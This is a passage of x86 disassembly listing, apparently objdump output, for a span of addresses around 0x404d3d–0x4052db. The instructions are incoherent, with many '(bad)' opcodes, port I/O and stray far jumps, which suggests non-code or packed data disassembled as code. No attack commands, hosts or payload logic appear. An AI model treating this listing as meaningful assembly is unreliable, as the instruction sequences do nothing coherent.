  404d3d:	3d 0c 6a dd 16       	cmp    $0x16dd6a0c,%eax
  404d42:	08 e8                	or     %ch,%al
  404d44:	83 f6 2c             	xor    $0x2c,%esi
  404d47:	04 f3                	add    $0xf3,%al
  404d49:	de 66 54             	fisubs 0x54(%esi)
  404d4c:	14 b4                	adc    $0xb4,%al
  404d4e:	8d 5c bc 2d          	lea    0x2d(%esp,%edi,4),%ebx
  404d52:	d3 7b 66             	sarl   %cl,0x66(%ebx)
  404d55:	64 d6                	fs salc
  404d57:	79 5e                	jns    0x404db7
  404d59:	9d                   	popf
  404d5a:	11 4c 17 fe          	adc    %ecx,-0x2(%edi,%edx,1)
  404d5e:	06                   	push   %es
  404d5f:	69 75 a0 36 d1 bf 4c 	imul   $0x4cbfd136,-0x60(%ebp),%esi
  404d66:	14 8b                	adc    $0x8b,%al
  404d68:	74 41                	je     0x404dab
  404d6a:	60                   	pusha
  404d6b:	8a e8                	mov    %al,%ch
  404d6d:	02 02                	add    (%edx),%al
  404d6f:	ad                   	lods   %ds:(%esi),%eax
  404d70:	aa                   	stos   %al,%es:(%edi)
  404d71:	69 71 2c 2e 8f e8 17 	imul   $0x17e88f2e,0x2c(%ecx),%esi
  404d78:	04 27                	add    $0x27,%al
  404d7a:	da b5 60 c2 0c 05    	fidivl 0x50cc260(%ebp)
  404d80:	b3 87                	mov    $0x87,%bl
  404d82:	c7                   	(bad)
  404d83:	1c 53                	sbb    $0x53,%al
  404d85:	00 7c bb 16          	add    %bh,0x16(%ebx,%edi,4)
  404d89:	ef                   	out    %eax,(%dx)
  404d8a:	0d 4d df 06 3b       	or     $0x3b06df4d,%eax
  404d8f:	9b                   	fwait
  404d90:	ba 07 02 5f e3       	mov    $0xe35f0207,%edx
  404d95:	54                   	push   %esp
  404d96:	54                   	push   %esp
  404d97:	58                   	pop    %eax
  404d98:	38 d9                	cmp    %bl,%cl
  404d9a:	79 a0                	jns    0x404d3c
  404d9c:	b1 64                	mov    $0x64,%cl
  404d9e:	66 dc 29             	data16 fsubrl (%ecx)
  404da1:	74 38                	je     0x404ddb
  404da3:	e4 25                	in     $0x25,%al
  404da5:	87 33                	xchg   %esi,(%ebx)
  404da7:	64 34 1a             	fs xor $0x1a,%al
  404daa:	2a 26                	sub    (%esi),%ah
  404dac:	e3 68                	jecxz  0x404e16
  404dae:	1b 31                	sbb    (%ecx),%esi
  404db0:	5e                   	pop    %esi
  404db1:	fa                   	cli
  404db2:	51                   	push   %ecx
  404db3:	fb                   	sti
  404db4:	32 30                	xor    (%eax),%dh
  404db6:	28 ef                	sub    %ch,%bh
  404db8:	58                   	pop    %eax
  404db9:	0c 64                	or     $0x64,%al
  404dbb:	ef                   	out    %eax,(%dx)
  404dbc:	73 99                	jae    0x404d57
  404dbe:	f1                   	int1
  404dbf:	04 48                	add    $0x48,%al
  404dc1:	3d af 71 76 06       	cmp    $0x67671af,%eax
  404dc6:	e0 d0                	loopne 0x404d98
  404dc8:	db 68 15             	fldt   0x15(%eax)
  404dcb:	5f                   	pop    %edi
  404dcc:	30 01                	xor    %al,(%ecx)
  404dce:	89 33                	mov    %esi,(%ebx)
  404dd0:	65 41                	gs inc %ecx
  404dd2:	b3 f4                	mov    $0xf4,%bl
  404dd4:	01 a9 8e 58 d4 b9    	add    %ebp,-0x462ba772(%ecx)
  404dda:	97                   	xchg   %eax,%edi
  404ddb:	02 df                	add    %bh,%bl
  404ddd:	6b 5b f0 2c          	imul   $0x2c,-0x10(%ebx),%ebx
  404de1:	1c 3b                	sbb    $0x3b,%al
  404de3:	0c f4                	or     $0xf4,%al
  404de5:	00 bb 66 20 23 03    	add    %bh,0x3232066(%ebx)
  404deb:	20 60 28             	and    %ah,0x28(%eax)
  404dee:	b8 4e fc 22 5e       	mov    $0x5e22fc4e,%eax
  404df3:	d9 86 9b 2d c4 71    	flds   0x71c42d9b(%esi)
  404df9:	68 99 26 44 0b       	push   $0xb442699
  404dfe:	fd                   	std
  404dff:	69 48 f6 58 d1 6d 6e 	imul   $0x6e6dd158,-0xa(%eax),%ecx
  404e06:	1c 60                	sbb    $0x60,%al
  404e08:	6a 9f                	push   $0xffffff9f
  404e0a:	93                   	xchg   %eax,%ebx
  404e0b:	64 71 d4             	fs jno 0x404de2
  404e0e:	d3 e7                	shl    %cl,%edi
  404e10:	d1 7f 06             	sarl   $1,0x6(%edi)
  404e13:	cd a1                	int    $0xa1
  404e15:	d1 b3 ce 2c 82 3f    	shll   $1,0x3f822cce(%ebx)
  404e1b:	55                   	push   %ebp
  404e1c:	46                   	inc    %esi
  404e1d:	05 1d 24 2e c5       	add    $0xc52e241d,%eax
  404e22:	34 1e                	xor    $0x1e,%al
  404e24:	cd 08                	int    $0x8
  404e26:	c8 71 1f 74          	enter  $0x1f71,$0x74
  404e2a:	23 df                	and    %edi,%ebx
  404e2c:	c1 96 6c a9 6d 4b da 	rcll   $0xda,0x4b6da96c(%esi)
  404e33:	22 27                	and    (%edi),%ah
  404e35:	d9 16                	fsts   (%esi)
  404e37:	d9 0a                	(bad) (%edx)
  404e39:	2a 88 1d 3d 0e 6c    	sub    0x6c0e3d1d(%eax),%cl
  404e3f:	1a ee                	sbb    %dh,%ch
  404e41:	3c 7f                	cmp    $0x7f,%al
  404e43:	67 74 08             	addr16 je 0x404e4e
  404e46:	50                   	push   %eax
  404e47:	29 aa 75 f4 74 e0    	sub    %ebp,-0x1f8b0b8b(%edx)
  404e4d:	aa                   	stos   %al,%es:(%edi)
  404e4e:	bc 77 44 cd dd       	mov    $0xddcd4477,%esp
  404e53:	0d e7 5c 1b 12       	or     $0x121b5ce7,%eax
  404e58:	74 4d                	je     0x404ea7
  404e5a:	de 38                	fidivrs (%eax)
  404e5c:	97                   	xchg   %eax,%edi
  404e5d:	70 14                	jo     0x404e73
  404e5f:	3b 99 f9 13 3c 26    	cmp    0x263c13f9(%ecx),%ebx
  404e65:	62 a7 3a 32 29 1c    	bound  %esp,0x1c29323a(%edi)
  404e6b:	0c c9                	or     $0xc9,%al
  404e6d:	36 04 e2             	ss add $0xe2,%al
  404e70:	93                   	xchg   %eax,%ebx
  404e71:	5d                   	pop    %ebp
  404e72:	67 44                	addr16 inc %esp
  404e74:	5b                   	pop    %ebx
  404e75:	fb                   	sti
  404e76:	44                   	inc    %esp
  404e77:	ff                   	(bad)
  404e78:	3e 91                	ds xchg %eax,%ecx
  404e7a:	6c                   	insb   (%dx),%es:(%edi)
  404e7b:	18 d2                	sbb    %dl,%dl
  404e7d:	ff a2 ac d7 52 fa    	jmp    *-0x5ad2854(%edx)
  404e83:	a1 fb 9d a1 02       	mov    0x2a19dfb,%eax
  404e88:	46                   	inc    %esi
  404e89:	58                   	pop    %eax
  404e8a:	ec                   	in     (%dx),%al
  404e8b:	0c 6f                	or     $0x6f,%al
  404e8d:	8b 32                	mov    (%edx),%esi
  404e8f:	08 aa a5 3a 5a 35    	or     %ch,0x355a3aa5(%edx)
  404e95:	6a 1a                	push   $0x1a
  404e97:	c8 7b 8e d6          	enter  $0x8e7b,$0xd6
  404e9b:	bf 33 24 1d 7d       	mov    $0x7d1d2433,%edi
  404ea0:	6d                   	insl   (%dx),%es:(%edi)
  404ea1:	b4 58                	mov    $0x58,%ah
  404ea3:	46                   	inc    %esi
  404ea4:	a8 63                	test   $0x63,%al
  404ea6:	c8 5f 30 29          	enter  $0x305f,$0x29
  404eaa:	56                   	push   %esi
  404eab:	f8                   	clc
  404eac:	33 fc                	xor    %esp,%edi
  404eae:	66 04 c4             	data16 add $0xc4,%al
  404eb1:	cd 30                	int    $0x30
  404eb3:	43                   	inc    %ebx
  404eb4:	8e b6 00 5c 24 0d    	mov    0xd245c00(%esi),%?
  404eba:	f8                   	clc
  404ebb:	06                   	push   %es
  404ebc:	35 51 6c 84 04       	xor    $0x4846c51,%eax
  404ec1:	2c 03                	sub    $0x3,%al
  404ec3:	c1 ac 3d ae 1c dc 85 	shrl   $0x35,-0x7a23e352(%ebp,%edi,1)
  404eca:	35 
  404ecb:	0f 14 04 1c          	unpcklps (%esp,%ebx,1),%xmm0
  404ecf:	8f                   	(bad)
  404ed0:	bb 4d 8a 0a e4       	mov    $0xe40a8a4d,%ebx
  404ed5:	b4 90                	mov    $0x90,%ah
  404ed7:	76 00                	jbe    0x404ed9
  404ed9:	09 fd                	or     %edi,%ebp
  404edb:	46                   	inc    %esi
  404edc:	e6 bf                	out    %al,$0xbf
  404ede:	e1 5c                	loope  0x404f3c
  404ee0:	25 b8 65 27 79       	and    $0x792765b8,%eax
  404ee5:	0d bc e8 60 a2       	or     $0xa260e8bc,%eax
  404eea:	65 64 ee             	gs fs out %al,(%dx)
  404eed:	1c dc                	sbb    $0xdc,%al
  404eef:	ad                   	lods   %ds:(%esi),%eax
  404ef0:	98                   	cwtl
  404ef1:	c3                   	ret
  404ef2:	18 d4                	sbb    %dl,%ah
  404ef4:	32 24 e0             	xor    (%eax,%eiz,8),%ah
  404ef7:	d1 13                	rcll   $1,(%ebx)
  404ef9:	71 58                	jno    0x404f53
  404efb:	2c 80                	sub    $0x80,%al
  404efd:	18 1c 45 67 14 34 80 	sbb    %bl,-0x7fcbeb99(,%eax,2)
  404f04:	14 30                	adc    $0x30,%al
  404f06:	14 c9                	adc    $0xc9,%al
  404f08:	49                   	dec    %ecx
  404f09:	6c                   	insb   (%dx),%es:(%edi)
  404f0a:	48                   	dec    %eax
  404f0b:	ee                   	out    %al,(%dx)
  404f0c:	3f                   	aas
  404f0d:	12 70 1a             	adc    0x1a(%eax),%dh
  404f10:	33 9d 83 c4 30 9c    	xor    -0x63cf3b7d(%ebp),%ebx
  404f16:	e4 5e                	in     $0x5e,%al
  404f18:	05 e9 5f 92 d2       	add    $0xd2925fe9,%eax
  404f1d:	64 db 2d 5e 13 fc 58 	fldt   %fs:0x58fc135e
  404f24:	c7                   	(bad)
  404f25:	79 dc                	jns    0x404f03
  404f27:	65 6c                	gs insb (%dx),%es:(%edi)
  404f29:	14 60                	adc    $0x60,%al
  404f2b:	3c 1d                	cmp    $0x1d,%al
  404f2d:	47                   	inc    %edi
  404f2e:	68 18 e4 70 7a       	push   $0x7a70e418
  404f33:	4e                   	dec    %esi
  404f34:	2c a1                	sub    $0xa1,%al
  404f36:	56                   	push   %esi
  404f37:	ff 46 cb             	incl   -0x35(%esi)
  404f3a:	0a eb                	or     %bl,%ch
  404f3c:	15 14 eb 9e 92       	adc    $0x929eeb14,%eax
  404f41:	c1 64 c6 77 2f       	shll   $0x2f,0x77(%esi,%eax,8)
  404f46:	e6 68                	out    %al,$0x68
  404f48:	1f                   	pop    %ds
  404f49:	c7                   	(bad)
  404f4a:	f1                   	int1
  404f4b:	36 5c                	ss pop %esp
  404f4d:	60                   	pusha
  404f4e:	64 71 92             	fs jno 0x404ee3
  404f51:	e7 67                	out    %eax,$0x67
  404f53:	64 60                	fs pusha
  404f55:	58                   	pop    %eax
  404f56:	04 da                	add    $0xda,%al
  404f58:	06                   	push   %es
  404f59:	e2 50                	loop   0x404fab
  404f5b:	fd                   	std
  404f5c:	fe                   	(bad)
  404f5d:	54                   	push   %esp
  404f5e:	ff 17                	call   *(%edi)
  404f60:	99                   	cltd
  404f61:	f8                   	clc
  404f62:	9c                   	pushf
  404f63:	0c d3                	or     $0xd3,%al
  404f65:	9d                   	popf
  404f66:	ef                   	out    %eax,(%dx)
  404f67:	e4 0d                	in     $0xd,%al
  404f69:	84 76 a2             	test   %dh,-0x5e(%esi)
  404f6c:	1a a3 8f 63 94 1d    	sbb    0x1d94638f(%ebx),%ah
  404f72:	bd a7 61 ec 58       	mov    $0x58ec61a7,%ebp
  404f77:	90                   	nop
  404f78:	77 f7                	ja     0x404f71
  404f7a:	1f                   	pop    %ds
  404f7b:	07                   	pop    %es
  404f7c:	30 ae fb bf 60 f3    	xor    %ch,-0xc9f4005(%esi)
  404f82:	18 6e cf             	sbb    %ch,-0x31(%esi)
  404f85:	58                   	pop    %eax
  404f86:	54                   	push   %esp
  404f87:	93                   	xchg   %eax,%ebx
  404f88:	d9 3d c9 50 03 bf    	fnstcw 0xbf0350c9
  404f8e:	51                   	push   %ecx
  404f8f:	f0 2a 9f 38 e5 19 04 	lock sub 0x419e538(%edi),%bl
  404f96:	50                   	push   %eax
  404f97:	50                   	push   %eax
  404f98:	06                   	push   %es
  404f99:	cc                   	int3
  404f9a:	54                   	push   %esp
  404f9b:	9e                   	sahf
  404f9c:	31 71 48             	xor    %esi,0x48(%ecx)
  404f9f:	87 b8 da 8c 4c ff    	xchg   %edi,-0xb37326(%eax)
  404fa5:	50                   	push   %eax
  404fa6:	77 5c                	ja     0x405004
  404fa8:	76 47                	jbe    0x404ff1
  404faa:	ea 7b f0 cb 38 d2 3f 	ljmp   $0x3fd2,$0x38cbf07b
  404fb1:	dd 64 4c c3          	frstor -0x3d(%esp,%ecx,2)
  404fb5:	ad                   	lods   %ds:(%esi),%eax
  404fb6:	12 34 84             	adc    (%esp,%eax,4),%dh
  404fb9:	ab                   	stos   %eax,%es:(%edi)
  404fba:	2e b9 43 d8 37 b0    	cs mov $0xb037d843,%ecx
  404fc0:	2d 4d 08 40 04       	sub    $0x440084d,%eax
  404fc5:	28 07                	sub    %al,(%edi)
  404fc7:	7d fa                	jge    0x404fc3
  404fc9:	3b ce                	cmp    %esi,%ecx
  404fcb:	4b                   	dec    %ebx
  404fcc:	7c a1                	jl     0x404f6f
  404fce:	7b 14                	jnp    0x404fe4
  404fd0:	57                   	push   %edi
  404fd1:	5c                   	pop    %esp
  404fd2:	bc 2f 18 61 9b       	mov    $0x9b61182f,%esp
  404fd7:	34 fc                	xor    $0xfc,%al
  404fd9:	02 14 03             	add    (%ebx,%eax,1),%dl
  404fdc:	63 a4 93 7d 74 30 7b 	arpl   %esp,0x7b30747d(%ebx,%edx,4)
  404fe3:	d8 44 22 d3          	fadds  -0x2d(%edx,%eiz,1)
  404fe7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404fe8:	51                   	push   %ecx
  404fe9:	bf 04 c3 f2 18       	mov    $0x18f2c304,%edi
  404fee:	51                   	push   %ecx
  404fef:	64 54                	fs push %esp
  404ff1:	89 13                	mov    %edx,(%ebx)
  404ff3:	ed                   	in     (%dx),%eax
  404ff4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404ff5:	9e                   	sahf
  404ff6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404ff7:	54                   	push   %esp
  404ff8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404ff9:	3b 1c 16             	cmp    (%esi,%edx,1),%ebx
  404ffc:	0d 9b 4c 28 cb       	or     $0xcb284c9b,%eax
  405001:	d2 9b d7 31 15 8e    	rcrb   %cl,-0x71eace29(%ebx)
  405007:	21 10                	and    %edx,(%eax)
  405009:	20 cb                	and    %cl,%bl
  40500b:	62 8e 65 6b e3 6c    	bound  %ecx,0x6ce36b65(%esi)
  405011:	1a 05 c6 04 72 12    	sbb    0x127204c6,%al
  405017:	13 7b 21             	adc    0x21(%ebx),%edi
  40501a:	b3 a3                	mov    $0xa3,%bl
  40501c:	14 68                	adc    $0x68,%al
  40501e:	3f                   	aas
  40501f:	8c bc 85 6b 72 c4 0b 	mov    %?,0xbc4726b(%ebp,%eax,4)
  405026:	63 4e 24             	arpl   %ecx,0x24(%esi)
  405029:	1c f0                	sbb    $0xf0,%al
  40502b:	c0 e4 d5             	shl    $0xd5,%ah
  40502e:	13 1c 5e             	adc    (%esi,%ebx,2),%ebx
  405031:	54                   	push   %esp
  405032:	cb                   	lret
  405033:	9c                   	pushf
  405034:	d1 27                	shll   $1,(%edi)
  405036:	2c 1d                	sub    $0x1d,%al
  405038:	35 b2 7a 95 a6       	xor    $0xa6957ab2,%eax
  40503d:	7d 74                	jge    0x4050b3
  40503f:	90                   	nop
  405040:	d4 38                	aam    $0x38
  405042:	12 65 1d             	adc    0x1d(%ebp),%ah
  405045:	8b 11                	mov    (%ecx),%edx
  405047:	8d 98 a2 8f c1 7e    	lea    0x7ec18fa2(%eax),%ebx
  40504d:	0a a0 58 8c 1b 71    	or     0x711b8c58(%eax),%ah
  405053:	70 1b                	jo     0x405070
  405055:	3a 5c d5 79          	cmp    0x79(%ebp,%edx,8),%bl
  405059:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40505a:	b2 4e                	mov    $0x4e,%dl
  40505c:	43                   	inc    %ebx
  40505d:	c6                   	(bad)
  40505e:	73 9d                	jae    0x404ffd
  405060:	0b 73 ef             	or     -0x11(%ebx),%esi
  405063:	69 fe 31 bf 6a 0f    	imul   $0xf6abf31,%esi,%edi
  405069:	42                   	inc    %edx
  40506a:	00 29                	add    %ch,(%ecx)
  40506c:	1e                   	push   %ds
  40506d:	1d e7 d1 48 48       	sbb    $0x4848d1e7,%eax
  405072:	02 44 fb af          	add    -0x51(%ebx,%edi,8),%al
  405076:	f4                   	hlt
  405077:	6e                   	outsb  %ds:(%esi),(%dx)
  405078:	48                   	dec    %eax
  405079:	73 fe                	jae    0x405079
  40507b:	15 96 71 6c 33       	adc    $0x336c7196,%eax
  405080:	68 b8 4e 1b 03       	push   $0x31b4eb8
  405085:	26 db 0f             	fisttpl %es:(%edi)
  405088:	22 00                	and    (%eax),%al
  40508a:	0e                   	push   %cs
  40508b:	4c                   	dec    %esp
  40508c:	10 0b                	adc    %cl,(%ebx)
  40508e:	e3 cc                	jecxz  0x40505c
  405090:	1c 8a                	sbb    $0x8a,%al
  405092:	1f                   	pop    %ds
  405093:	fd                   	std
  405094:	10 d1                	adc    %dl,%cl
  405096:	eb 4d                	jmp    0x4050e5
  405098:	5c                   	pop    %esp
  405099:	e7 68                	out    %eax,$0x68
  40509b:	9f                   	lahf
  40509c:	44                   	inc    %esp
  40509d:	4c                   	dec    %esp
  40509e:	0c a5                	or     $0xa5,%al
  4050a0:	62 a1 1c 80 58 6c    	bound  %esp,0x6c58801c(%ecx)
  4050a6:	bb 14 01 24 b8       	mov    $0xb8240114,%ebx
  4050ab:	ee                   	out    %al,(%dx)
  4050ac:	36 38 00             	cmp    %al,%ss:(%eax)
  4050af:	90                   	nop
  4050b0:	86 c5                	xchg   %al,%ch
  4050b2:	de f3                	fdivp  %st,%st(3)
  4050b4:	5f                   	pop    %edi
  4050b5:	ec                   	in     (%dx),%al
  4050b6:	4d                   	dec    %ebp
  4050b7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4050b8:	6d                   	insl   (%dx),%es:(%edi)
  4050b9:	b5 6f                	mov    $0x6f,%ch
  4050bb:	e5 8e                	in     $0x8e,%eax
  4050bd:	4a                   	dec    %edx
  4050be:	9b                   	fwait
  4050bf:	b9 85 eb 9a e9       	mov    $0xe99aeb85,%ecx
  4050c4:	37                   	aaa
  4050c5:	6b 23 7a             	imul   $0x7a,(%ebx),%esp
  4050c8:	4d                   	dec    %ebp
  4050c9:	cf                   	iret
  4050ca:	50                   	push   %eax
  4050cb:	e9 1f 28 9d d9       	jmp    0xd9dd78ef
  4050d0:	e2 b9                	loop   0x40508b
  4050d2:	06                   	push   %es
  4050d3:	6c                   	insb   (%dx),%es:(%edi)
  4050d4:	f6 38                	idivb  (%eax)
  4050d6:	da 87 51 68 59 0e    	fiaddl 0xe596851(%edi)
  4050dc:	0c b6                	or     $0xb6,%al
  4050de:	b8 68 50 d7 74       	mov    $0x74d75068,%eax
  4050e3:	f4                   	hlt
  4050e4:	04 15                	add    $0x15,%al
  4050e6:	17                   	pop    %ss
  4050e7:	22 7f 31             	and    0x31(%edi),%bh
  4050ea:	78 07                	js     0x4050f3
  4050ec:	3f                   	aas
  4050ed:	fd                   	std
  4050ee:	38 42 1d             	cmp    %al,0x1d(%edx)
  4050f1:	ee                   	out    %al,(%dx)
  4050f2:	29 23                	sub    %esp,(%ebx)
  4050f4:	b1 09                	mov    $0x9,%cl
  4050f6:	6c                   	insb   (%dx),%es:(%edi)
  4050f7:	21 ac 79 b1 30 00 8c 	and    %ebp,-0x73ffcf4f(%ecx,%edi,2)
  4050fe:	de 07                	fiadds (%edi)
  405100:	bd 9f 25 6f 5c       	mov    $0x5c6f259f,%ebp
  405105:	88 70 60             	mov    %dh,0x60(%eax)
  405108:	88 c6                	mov    %al,%dh
  40510a:	d5 df                	aad    $0xdf
  40510c:	6c                   	insb   (%dx),%es:(%edi)
  40510d:	d3 c1                	rol    %cl,%ecx
  40510f:	a0 73 04 ff 2e       	mov    0x2eff0473,%al
  405114:	1a d1                	sbb    %cl,%dl
  405116:	a0 d9 4c f9 a8       	mov    0xa8f94cd9,%al
  40511b:	c9                   	leave
  40511c:	d9 80 29 27 9a 74    	flds   0x749a2729(%eax)
  405122:	1e                   	push   %ds
  405123:	05 fd 16 0c 2c       	add    $0x2c0c16fd,%eax
  405128:	03 1e                	add    (%esi),%ebx
  40512a:	02 58 11             	add    0x11(%eax),%bl
  40512d:	46                   	inc    %esi
  40512e:	ea 87 a9 46 2e fa d5 	ljmp   $0xd5fa,$0x2e46a987
  405135:	98                   	cwtl
  405136:	2f                   	das
  405137:	2d e1 26 47 f5       	sub    $0xf54726e1,%eax
  40513c:	12 be d8 33 0c fc    	adc    -0x3f3cc28(%esi),%bh
  405142:	0b 09                	or     (%ecx),%ecx
  405144:	46                   	inc    %esi
  405145:	40                   	inc    %eax
  405146:	3b 2e                	cmp    (%esi),%ebp
  405148:	f6 6c 0b 4d          	imulb  0x4d(%ebx,%ecx,1)
  40514c:	49                   	dec    %ecx
  40514d:	1d a6 5f 8f 55       	sbb    $0x558f5fa6,%eax
  405152:	ff 1c 0a             	lcall  *(%edx,%ecx,1)
  405155:	60                   	pusha
  405156:	9c                   	pushf
  405157:	ef                   	out    %eax,(%dx)
  405158:	c0 28 d6             	shrb   $0xd6,(%eax)
  40515b:	02 f3                	add    %bl,%dh
  40515d:	10 e2                	adc    %ah,%dl
  40515f:	f2 38 f3             	repnz cmp %dh,%bl
  405162:	6a 20                	push   $0x20
  405164:	79 1d                	jns    0x405183
  405166:	34 cd                	xor    $0xcd,%al
  405168:	35 80 d1 4f 30       	xor    $0x304fd180,%eax
  40516d:	e7 76                	out    %eax,$0x76
  40516f:	41                   	inc    %ecx
  405170:	f8                   	clc
  405171:	97                   	xchg   %eax,%edi
  405172:	f2 cc                	repnz int3
  405174:	57                   	push   %edi
  405175:	ce                   	into
  405176:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405177:	c5 b1 50 70 76 a3    	lds    -0x5c898fb0(%ecx),%esi
  40517d:	66 c8 11 38 30       	enterw $0x3811,$0x30
  405182:	9c                   	pushf
  405183:	16                   	push   %ss
  405184:	95                   	xchg   %eax,%ebp
  405185:	e0 1c                	loopne 0x4051a3
  405187:	4b                   	dec    %ebx
  405188:	f0 b8 64 fc 0e fe    	lock mov $0xfe0efc64,%eax
  40518e:	74 39                	je     0x4051c9
  405190:	0e                   	push   %cs
  405191:	c2 cc 1a             	ret    $0x1acc
  405194:	57                   	push   %edi
  405195:	e9 1b 8e 33 68       	jmp    0x6873dfb5
  40519a:	27                   	daa
  40519b:	f0 60                	lock pusha
  40519d:	fd                   	std
  40519e:	c7                   	(bad)
  40519f:	10 0c 07             	adc    %cl,(%edi,%eax,1)
  4051a2:	ed                   	in     (%dx),%eax
  4051a3:	07                   	pop    %es
  4051a4:	9f                   	lahf
  4051a5:	ac                   	lods   %ds:(%esi),%al
  4051a6:	a9 85 ca 96 12       	test   $0x1296ca85,%eax
  4051ab:	10 04 23             	adc    %al,(%ebx,%eiz,1)
  4051ae:	7b 51                	jnp    0x405201
  4051b0:	74 0b                	je     0x4051bd
  4051b2:	75 a4                	jne    0x405158
  4051b4:	44                   	inc    %esp
  4051b5:	4d                   	dec    %ebp
  4051b6:	8c 59 72             	mov    %ds,0x72(%ecx)
  4051b9:	19 b4 e3 94 63 a8 f5 	sbb    %esi,-0xa579c6c(%ebx,%eiz,8)
  4051c0:	02 37                	add    (%edi),%dh
  4051c2:	c4 7a bf             	les    -0x41(%edx),%edi
  4051c5:	03 66 5b             	add    0x5b(%esi),%esp
  4051c8:	ed                   	in     (%dx),%eax
  4051c9:	d9 70 85             	fnstenv -0x7b(%eax)
  4051cc:	77 56                	ja     0x405224
  4051ce:	db 60 07             	(bad) 0x7(%eax)
  4051d1:	10 50 6a             	adc    %dl,0x6a(%eax)
  4051d4:	29 74 27 23          	sub    %esi,0x23(%edi,%eiz,1)
  4051d8:	27                   	daa
  4051d9:	5c                   	pop    %esp
  4051da:	68 26 14 60 f4       	push   $0xf4601426
  4051df:	0d eb b3 fb e6       	or     $0xe6fbb3eb,%eax
  4051e4:	c8 6d e1 77          	enter  $0xe16d,$0x77
  4051e8:	4a                   	dec    %edx
  4051e9:	5f                   	pop    %edi
  4051ea:	cc                   	int3
  4051eb:	35 9b 34 62 04       	xor    $0x462349b,%eax
  4051f0:	1c 34                	sbb    $0x34,%al
  4051f2:	c7                   	(bad)
  4051f3:	b1 a7                	mov    $0xa7,%cl
  4051f5:	43                   	inc    %ebx
  4051f6:	d6                   	salc
  4051f7:	0c d8                	or     $0xd8,%al
  4051f9:	d1 f9                	sar    $1,%ecx
  4051fb:	51                   	push   %ecx
  4051fc:	8c c7                	mov    %es,%edi
  4051fe:	61                   	popa
  4051ff:	1a 05 6b 88 83 0c    	sbb    0xc83886b,%al
  405205:	d7                   	xlat   %ds:(%ebx)
  405206:	00 56 d8             	add    %dl,-0x28(%esi)
  405209:	58                   	pop    %eax
  40520a:	69 96 47 dd 0c 1a fa 	imul   $0xff79f8fa,0x1a0cdd47(%esi),%edx
  405211:	f8 79 ff 
  405214:	0e                   	push   %cs
  405215:	c7                   	(bad)
  405216:	cc                   	int3
  405217:	4d                   	dec    %ebp
  405218:	87 35 39 a5 58 37    	xchg   %esi,0x3758a539
  40521e:	af                   	scas   %es:(%edi),%eax
  40521f:	4b                   	dec    %ebx
  405220:	e0 5f                	loopne 0x405281
  405222:	d3 a2 78 a8 7d 23    	shll   %cl,0x237da878(%edx)
  405228:	df 11                	fists  (%ecx)
  40522a:	58                   	pop    %eax
  40522b:	5c                   	pop    %esp
  40522c:	34 f3                	xor    $0xf3,%al
  40522e:	3d e4 16 d9 59       	cmp    $0x59d916e4,%eax
  405233:	38 a4 52 74 0e 9a 21 	cmp    %ah,0x219a0e74(%edx,%edx,2)
  40523a:	6a 17                	push   $0x17
  40523c:	78 88                	js     0x4051c6
  40523e:	85 31                	test   %esi,(%ecx)
  405240:	ce                   	into
  405241:	8d 36                	lea    (%esi),%esi
  405243:	53                   	push   %ebx
  405244:	50                   	push   %eax
  405245:	3a 0a                	cmp    (%edx),%cl
  405247:	3d 5d fb 28 3a       	cmp    $0x3a28fb5d,%eax
  40524c:	e4 52                	in     $0x52,%al
  40524e:	2f                   	das
  40524f:	1c 46                	sbb    $0x46,%al
  405251:	f7 99 e8 2c 33 f0    	negl   -0xfccd318(%ecx)
  405257:	a1 02 0c ff fb       	mov    0xfbff0c02,%eax
  40525c:	1f                   	pop    %ds
  40525d:	fc                   	cld
  40525e:	fe 04 5e             	incb   (%esi,%ebx,2)
  405261:	04 ec                	add    $0xec,%al
  405263:	f6 1c 80             	negb   (%eax,%eax,4)
  405266:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405267:	2b d7                	sub    %edi,%edx
  405269:	b7 02                	mov    $0x2,%bh
  40526b:	b0 a4                	mov    $0xa4,%al
  40526d:	5e                   	pop    %esi
  40526e:	3a fb                	cmp    %bl,%bh
  405270:	ef                   	out    %eax,(%dx)
  405271:	bc c9 2b f4 13       	mov    $0x13f42bc9,%esp
  405276:	a9 a3 2c 3c 0b       	test   $0xb3c2ca3,%eax
  40527b:	3a 46 1c             	cmp    0x1c(%esi),%al
  40527e:	85 75 2b             	test   %esi,0x2b(%ebp)
  405281:	4f                   	dec    %edi
  405282:	76 ba                	jbe    0x40523e
  405284:	57                   	push   %edi
  405285:	f5                   	cmc
  405286:	bf 87 b0 90 d3       	mov    $0xd390b087,%edi
  40528b:	a8 a8                	test   $0xa8,%al
  40528d:	79 74                	jns    0x405303
  40528f:	35 ef ab f1 60       	xor    $0x60f1abef,%eax
  405294:	99                   	cltd
  405295:	0e                   	push   %cs
  405296:	cb                   	lret
  405297:	69 0c 71 c7 10 83 02 	imul   $0x28310c7,(%ecx,%esi,2),%ecx
  40529e:	19 35 26 c0 ab 0b    	sbb    %esi,0xbabc026
  4052a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a5:	3c 16                	cmp    $0x16,%al
  4052a7:	c4 09                	les    (%ecx),%ecx
  4052a9:	0b 70 fd             	or     -0x3(%eax),%esi
  4052ac:	ab                   	stos   %eax,%es:(%edi)
  4052ad:	af                   	scas   %es:(%edi),%eax
  4052ae:	01 5a 27             	add    %ebx,0x27(%edx)
  4052b1:	2f                   	das
  4052b2:	74 8a                	je     0x40523e
  4052b4:	79 2a                	jns    0x4052e0
  4052b6:	b1 4a                	mov    $0x4a,%cl
  4052b8:	34 e7                	xor    $0xe7,%al
  4052ba:	44                   	inc    %esp
  4052bb:	08 9d 28 44 d6 70    	or     %bl,0x70d64428(%ebp)
  4052c1:	18 45 54             	sbb    %al,0x54(%ebp)
  4052c4:	fe                   	(bad)
  4052c5:	70 14                	jo     0x4052db
  4052c7:	d6                   	salc
  4052c8:	2d 10 2b 28 04       	sub    $0x4282b10,%eax
  4052cd:	d1 7f 84             	sarl   $1,-0x7c(%edi)
  4052d0:	a9 71 e3 9b 91       	test   $0x919be371,%eax
  4052d5:	5a                   	pop    %edx
  4052d6:	31 00                	xor    %eax,(%eax)
  4052d8:	04 0b                	add    $0xb,%al
  4052da:	94                   	xchg   %eax,%esp
  4052db:	2f                   	das
